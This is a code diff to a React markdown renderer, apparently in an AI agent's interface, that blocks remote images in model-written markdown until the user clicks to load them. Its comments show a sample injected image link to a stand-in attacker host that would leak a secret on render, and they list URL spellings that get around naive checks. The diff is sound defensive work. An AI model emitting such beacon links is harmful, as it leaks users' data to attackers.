@@ -7,6 +7,7 @@ import rehypeSlug from 'rehype-slug'
 import rehypeHighlight from 'rehype-highlight'
 import rehypeExternalLinks from 'rehype-external-links'
 import rehypeSanitize, { defaultSchema } from 'rehype-sanitize'
+import { ImageOff } from 'lucide-react'
 import { cn } from '@/lib/utils'
 import { isAbsolutePath, isLocalFileHref, isExternalUrl, parseLocalFileHref, resolveFileRefPath } from '@/lib/localFileLink'
 import { readFileAsDataURL } from '@/api/workspace'
@@ -141,9 +142,64 @@ interface MarkdownImageProps {
   workspaceRoot?: string | null
 }
 
-/** Resolves a markdown image src to a loadable value (data URL or external URL). */
+// Remote HTTP(S) image srcs are NEVER fetched automatically: model-authored
+// markdown is untrusted content, and an injected reference like
+// `![x](https://evil.example/?d=secret)` would otherwise turn the webview into
+// a tracking/exfiltration beacon the moment the message renders (each render
+// issues a GET to the attacker-chosen origin). Such srcs render as a
+// click-to-load placeholder instead; loading requires an explicit user
+// gesture. data: URLs (inline bytes, no network fetch) and local workspace
+// paths (resolved through the backend RPC into data: URLs) keep loading as
+// before.
+//
+// The match deliberately covers more than a literal `https://` prefix: the
+// webview's URL parser normalizes special-scheme spellings, so `https:/host`
+// (one slash) resolves to the same remote origin, and a bare protocol-relative
+// `//host` resolves against the page's scheme. All of these must hit the gate
+// or the control is bypassable. The normalization also catches `\\host\path`
+// (WHATWG parsing treats `\` as `/`), which gates UNC-shaped srcs behind the
+// same click — a deliberate trade: a real UNC path still loads, but only
+// after consent, never as an automatic cross-origin fetch.
+const REMOTE_SRC_RE = /^(?:https?:|\/\/)/i
+
+// Backslashes are normalized before matching — in special-scheme URL parsing
+// (the webview page is served over http/wails scheme) `\` is treated as `/`,
+// so `\\evil.com\x.png` is the protocol-relative `//evil.com/x.png`.
+const isRemoteHTTPSrc = (src: string | undefined): boolean =>
+  !!src && REMOTE_SRC_RE.test(src.replace(/\\/g, '/'))
+
 function MarkdownImage({ src, alt, title, baseFilePath, workspaceRoot }: MarkdownImageProps) {
-  const resolved = useMarkdownImageSrc(src, baseFilePath, workspaceRoot)
+  const remote = isRemoteHTTPSrc(src)
+  // Per-src consent keyed BY SRC: the click approves exactly this src, and a
+  // changed src closes the gate in the same render — the invariant holds by
+  // construction, not by effect ordering.
+  const [allowedSrc, setAllowedSrc] = useState<string | null>(null)
+  const gated = remote && allowedSrc !== src
+  const resolved = useMarkdownImageSrc(
+    gated ? undefined : src,
+    baseFilePath,
+    workspaceRoot,
+  )
+  if (gated) {
+    return (
+      <span
+        data-testid="markdown-image-blocked"
+        className="my-1 inline-flex max-w-full items-center gap-1.5 rounded border border-dashed border-border px-2 py-1 align-middle text-xs text-muted-foreground"
+      >
+        <ImageOff className="size-3.5 shrink-0" aria-hidden="true" />
+        <span className="truncate">External image{src ? ` (${src})` : ''}</span>
+        <button
+          type="button"
+          data-testid="markdown-image-load"
+          title={src}
+          className="shrink-0 cursor-pointer text-info hover:underline"
+          onClick={() => setAllowedSrc(src ?? null)}
+        >
+          Load
+        </button>
+      </span>
+    )
+  }
   return <img src={resolved ?? TRANSPARENT_PIXEL} alt={alt} title={title} loading="lazy" />
 }
 
